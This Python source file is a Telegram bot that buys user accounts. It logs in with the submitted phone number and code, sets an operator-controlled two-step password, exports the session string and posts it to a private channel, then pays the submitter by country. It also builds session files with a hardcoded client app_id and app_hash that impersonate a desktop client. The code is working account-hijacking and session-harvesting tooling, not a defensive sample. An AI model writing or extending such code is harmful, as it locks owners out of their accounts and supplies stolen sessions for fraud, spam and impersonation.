import os
import asyncio
import json
from datetime import datetime
from telethon import TelegramClient, functions
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
from pyrogram import Client

from bot.config import (
    API_ID, API_HASH, BOT_TOKEN,
    CHANNEL_SUBMIT, CHANNEL_VERIFIED, CHANNEL_REJECTED,
    SESSION_2FA_PASSWORD, VERIFICATION_DELAY
)
from bot.utils.storage import get_user_info, update_user_info, get_country_rates

# ---------------- Ensure sessions folder exists -----------------
os.makedirs("sessions", exist_ok=True)

# ---------------- TELETHON SESSION HANDLER -----------------
async def create_telethon_client(phone: str, session_name: str):
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    return client

# ---------------- JSON CREATORS -----------------
def create_submission_json(user_id, phone):
    return {
        "user_id": user_id,
        "phone": phone,
        "status": "pending",
        "created_at": str(datetime.now())
    }

def create_verified_json(user_id, phone, string_session, added_balance):
    return {
        "user_id": user_id,
        "phone": phone,
        "string_session": string_session,
        "2fa_enabled": True,
        "status": "verified",
        "balance_added": added_balance,
        "created_at": str(datetime.now()),
        "admin_set_2fa": True
    }

def create_rejected_json(user_id, phone):
    return {
        "user_id": user_id,
        "phone": phone,
        "status": "rejected",
        "reason": "2FA already enabled or verification failed",
        "message": "Sorry this account was rejected, disable the account password and try again ❌",
        "created_at": str(datetime.now())
    }

# ---------------- CHANNEL SEND -----------------
async def send_json_to_channel(pyro_client: Client, channel_id, data: dict, file_name: str):
    try:
        await pyro_client.send_document(
            chat_id=channel_id,
            document=json.dumps(data, indent=4).encode('utf-8'),
            file_name=file_name,
            caption=f"{data.get('status').upper()} | {data.get('phone')}"
        )
    except Exception as e:
        print(f"[ERROR] Sending to channel {channel_id}: {e}")

# ---------------- SEND PROCESSING MESSAGE -----------------
async def send_processing_message(pyro_client: Client, user_id: int):
    await pyro_client.send_message(
        chat_id=user_id, 
        text="🔄 Processing\n📳 Please wait for the code..."
    )

# ---------------- OTP REQUEST FUNCTION -----------------
async def send_otp_code(pyro_client: Client, user_id: int, phone: str):
    await send_processing_message(pyro_client, user_id)
    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)
    try:
        await client.send_code_request(phone)
        await pyro_client.send_message(
            chat_id=user_id,
            text=f"🔄 OTP sent to {phone}. Please check your Telegram."
        )
    except Exception as e:
        print(f"[ERROR] OTP sending failed: {e}")
    finally:
        await client.disconnect()

# ---------------- VERIFY FUNCTION -----------------
async def verify_account(pyro_client: Client, user_id: int, phone: str, otp_code: str):
    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)
    try:
        await client.sign_in(phone=phone, code=otp_code)

        # 2FA সক্রিয় করা
        try:
            await client(functions.account.UpdatePasswordRequest(
                current_password=None,
                new_password=SESSION_2FA_PASSWORD,
                hint="By Bot",
                email=None
            ))
        except SessionPasswordNeededError:
            print(f"[INFO] 2FA already enabled for {phone}")

        # Session string export
        string_session = await client.export_session_string()

        # Country based balance
        user_info = get_user_info(user_id)
        country_code = user_info.get("country", "US")
        country_rates = get_country_rates()
        added_balance = country_rates.get(country_code.upper(), 0)
        new_balance = user_info.get("balance_usd", 0) + added_balance
        update_user_info(user_id, {"balance_usd": new_balance})

        # Send verified JSON
        verified_data = create_verified_json(user_id, phone, string_session, added_balance)
        file_name = f"{user_id}_verified.json"
        await send_json_to_channel(pyro_client, CHANNEL_VERIFIED, verified_data, file_name)

        await pyro_client.send_message(
            chat_id=user_id,
            text=f"🎉 Account verified!\nNumber: {phone}\nPrice: ${added_balance} added to your balance."
        )
    except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
        await pyro_client.send_message(
            chat_id=user_id,
            text="⛔ Invalid or expired code. Please try again carefully."
        )
    except Exception as e:
        print(f"[ERROR] Verification failed: {e}")
    finally:
        await client.disconnect()

# ---------------- CHECK MULTIPLE SESSIONS -----------------
async def check_multiple_sessions(pyro_client: Client, user_id: int, phone: str):
    client = await create_telethon_client(phone, f"sessions/{user_id}")
    try:
        sessions = await client.get_sessions()
        if len(sessions) > 1:
            await pyro_client.send_message(
                chat_id=user_id,
                text=f"⚠️ Multiple active sessions detected for {phone}\nTotal devices: {len(sessions)}\nAccount rejected."
            )
            rejected_data = create_rejected_json(user_id, phone)
            file_name = f"{user_id}_rejected.json"
            await send_json_to_channel(pyro_client, CHANNEL_REJECTED, rejected_data, file_name)
        else:
            await pyro_client.send_message(
                chat_id=user_id,
                text="✅ Single active session detected, proceeding..."
            )
    except Exception as e:
        print(f"[ERROR] Session check failed: {e}")
    finally:
        await client.disconnect()

# ---------------- FINAL STEP -----------------
async def finalize_session(pyro_client: Client, user_id: int, phone: str):
    session_name = f"sessions/{user_id}"
    client = await create_telethon_client(phone, session_name)
    try:
        string_session = await client.export_session_string()
        session_data = {
            "user_id": user_id,
            "phone": phone,
            "session_string": string_session,
            "status": "completed",
            "created_at": str(datetime.now())
        }
        file_name = f"{user_id}_session.json"
        await send_json_to_channel(pyro_client, CHANNEL_VERIFIED, session_data, file_name)
    finally:
        await client.disconnect()

# ---------------- CREATE JSON FOR USER INPUT -----------------
def create_user_session_json():
    first_name = input("First name: ")
    last_name = input("Last name: ")
    phone = input("Phone number: ")
    user_id = int(input("User ID: "))
    app_version = input("App version: ")
    device = input("Device name: ")
    system_lang = input("System language (e.g., en-US): ")
    avatar = input("Avatar path (default img/default.png): ") or "img/default.png"
    sex = int(input("Sex (0=Unknown,1=Male,2=Female): "))
    twoFA = input("2FA code: ")

    user_data = {
        "session_file": phone,
        "phone": phone,
        "user_id": user_id,
        "app_id": 2040,
        "app_hash": "b18441a1ff607e10a989891a5462e627",
        "sdk": "Windows 11",
        "app_version": app_version,
        "device": device,
        "avatar": avatar,
        "first_name": first_name,
        "last_name": last_name,
        "sex": sex,
        "system_lang_code": system_lang,
        "twoFA": twoFA,
        "ipv6": False
    }

    file_name = f"user_session_{phone}.json"
    with open(file_name, 'w') as f:
        json.dump(user_data, f, indent=4)

    print(f"✅ JSON file '{file_name}' successfully created!")

# Uncomment below line to test creating user session JSON interactively
# create_user_session_json()
